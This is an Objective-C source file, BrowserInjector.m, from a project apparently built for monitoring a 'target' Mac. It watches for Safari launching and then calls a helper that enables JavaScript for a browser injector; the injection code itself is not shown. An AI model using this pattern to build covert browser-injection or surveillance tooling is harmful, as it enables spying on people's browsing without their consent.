//
//  BrowserInjector.m
//  blbld
//
//  Created by Khaneid Hantanasiriskul on 10/21/2559 BE.
//
//

#import "BrowserInjector.h"

#import "blbldUtils.h"
#import "TargetIdentity.h"

@implementation BrowserInjector

@synthesize mBrowserInjectorPath;

- (void) start{
    DLog(@"registerNotificationForSafari");
    [[[NSWorkspace sharedWorkspace] notificationCenter] addObserver:self selector:@selector(didFinishLaunch:) name:NSWorkspaceDidLaunchApplicationNotification object:nil];
}

- (void) stop{
    [[[NSWorkspace sharedWorkspace] notificationCenter]removeObserver:self name:NSWorkspaceDidLaunchApplicationNotification object:nil];
}

- (void) didFinishLaunch:(NSNotification *)notification {
    DLog(@"notification : %@",notification);
    NSDictionary *userInfo = [notification userInfo];
    if ([[userInfo objectForKey:@"NSApplicationBundleIdentifier"]isEqualToString:kSafari]) {
        [blbldUtils allowJavaScriptInSafari:self.mBrowserInjectorPath];
    }
}

-(void) dealloc {
    [super dealloc];
}

@end
